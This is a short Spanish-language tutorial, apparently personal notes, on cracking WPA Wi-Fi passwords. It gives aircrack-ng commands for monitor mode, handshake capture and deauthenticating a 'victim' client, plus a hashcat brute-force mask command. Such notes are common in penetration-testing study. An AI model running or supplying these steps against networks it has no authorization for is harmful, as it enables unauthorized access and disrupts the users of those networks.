# Wireless Cracking

## Cracking WPA por fuerza bruta

### Preparar el entorno
Lo primero que necesitamos es una tarjeta de red compatible con el modo monitor e inyección de paquetes. Se pueden consultar los modelos compatibles aqui:  [Compatible Adapters](https://deviwiki.com/wiki/List_of_Wireless_Adapters_That_Support_Monitor_Mode_and_Packet_Injection)  

Programas necesarios: Suite Aircrack, hashcat.


### Escaneo

Matamos los procesos que puedan dar conflicto  
```
airmon-ng check kill
```

Iniciamos escaneo
´´´
airmon-ng start <interfaz>
```
Fijamos objetivo, anotando su MAC y la MAC del cliente víctima

### Captura Handshake

´´´
airodump-ng -w <fichero.cap> -c <canal(opcional)> --bssid <MAC AP> <interfaz>
´´´

### Deautenticación

```
aireplay -a <MAC AP> -c <MAC CLIENTE VICTIMA> -0 1 -D --ignore-negative-one <interfaz>
```

Llegados a este punto, en la terminal donde tenemos corriendo el airodump, debemos ver el handshake capturado.  

### Crackeo con hashcat

Primero debemos convertir la captura.cap a un formato que hashcat entienda, para ello subimos el fichero a: [Cap2hashcat](https://hashcat.net/cap2hashcat/) y descargamos el fichero.  

En **Hashcat**  
```
hashcat -m 22000 hash.hc22000 -a3 -1 ?l?u?d ?1?1?1?1?1?1?1?1
```

Dónde:  
* ?l son letras lowercase
* ?u son letras uppercase
* ?d son numeros
* ?a serían numeros, letras mayusculas, minusculas y caracteres especiales
* ?h serian letras lower + numeros
* ?H serian letras upper + numeros

En este caso creamos una máscara personalizada con **-1** seguido de lo que queremos incluir, y al final ponemos tantos ?1 como caracteres queramos que compruebe, en este caso 8.